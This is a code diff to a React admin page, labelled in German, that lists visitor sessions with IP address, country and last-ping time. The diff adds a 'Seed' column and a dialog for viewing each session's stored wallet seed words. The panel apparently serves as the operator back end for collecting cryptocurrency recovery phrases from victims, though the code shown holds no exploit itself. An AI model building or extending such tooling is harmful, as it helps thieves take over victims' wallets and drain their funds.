@@ -27,6 +27,7 @@ function isActive(s: Session) {
 export default function Sessions() {
   const [rows, setRows] = useState<Session[]>([]);
   const [open, setOpen] = useState<Session | null>(null);
+  const [seedOpenId, setSeedOpenId] = useState<string | null>(null);
 
   useEffect(() => {
     supabase
@@ -62,6 +63,11 @@ export default function Sessions() {
     return new Date(b.last_seen_at).getTime() - new Date(a.last_seen_at).getTime();
   });
 
+  const seedSession = useMemo(
+    () => (seedOpenId ? rows.find((r) => r.id === seedOpenId) ?? null : null),
+    [seedOpenId, rows],
+  );
+
   return (
     <div className="p-6">
       <h2 className="text-2xl font-semibold mb-4">Sessions</h2>
@@ -75,6 +81,7 @@ export default function Sessions() {
               <th className="p-3">IP / Land</th>
               <th className="p-3">Letzter Ping</th>
               <th className="p-3">Erstellt</th>
+              <th className="p-3">Seed</th>
               <th className="p-3"></th>
             </tr>
           </thead>
@@ -98,13 +105,23 @@ export default function Sessions() {
                 <td className="p-3 text-xs">{new Date(r.last_seen_at).toLocaleTimeString()}</td>
                 <td className="p-3 text-xs">{new Date(r.created_at).toLocaleString()}</td>
                 <td className="p-3">
+                  <Button
+                    size="icon"
+                    variant="ghost"
+                    title="Seed anzeigen"
+                    onClick={() => setSeedOpenId(r.id)}
+                  >
+                    <Eye className="h-4 w-4" />
+                  </Button>
+                </td>
+                <td className="p-3">
                   <Button size="sm" variant="outline" onClick={() => setOpen(r)}>Details</Button>
                 </td>
               </tr>
             ))}
             {sorted.length === 0 && (
               <tr>
-                <td colSpan={7} className="p-8 text-center text-muted-foreground">Noch keine Sessions.</td>
+                <td colSpan={8} className="p-8 text-center text-muted-foreground">Noch keine Sessions.</td>
               </tr>
             )}
           </tbody>
@@ -112,9 +129,11 @@ export default function Sessions() {
       </Card>
 
       <SessionDetail session={open} onClose={() => setOpen(null)} />
+      <SeedPeekDialog session={seedSession} onClose={() => setSeedOpenId(null)} />
     </div>
   );
 }
+
 
 function SessionDetail({ session, onClose }: { session: Session | null; onClose: () => void }) {
   const [words, setWords] = useState<SeedWord[]>([]);
